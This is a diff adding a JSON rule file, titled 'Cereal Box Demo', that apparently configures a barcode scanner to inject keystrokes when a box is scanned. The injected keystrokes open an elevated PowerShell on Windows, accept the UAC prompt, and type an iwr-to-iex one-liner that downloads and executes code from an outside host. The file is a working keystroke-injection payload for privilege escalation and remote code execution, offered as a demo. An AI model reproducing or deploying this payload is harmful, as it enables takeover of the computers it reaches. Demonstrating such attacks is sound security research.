@@ -1,0 +1,24 @@
+{
+  "name": "Cereal Box Demo",
+  "description": "Scan a box of Smorz and watch the shells drop",
+
+  "setup": {
+    "options": [],
+    "rules": [
+      {
+        "criteria": [
+          ["stringatstart", "0"]
+        ],
+        "actions": [
+          ["sendgui", "X"],
+          ["sendtext", "A"],
+          ["sendpause"],
+          ["sendalt", "Y"],
+          ["sendpause"],
+          ["sendtext", ".{iwr s.mwe.st}|iex"],
+          ["sendenter"]
+        ]
+      }
+    ]
+  }
+}
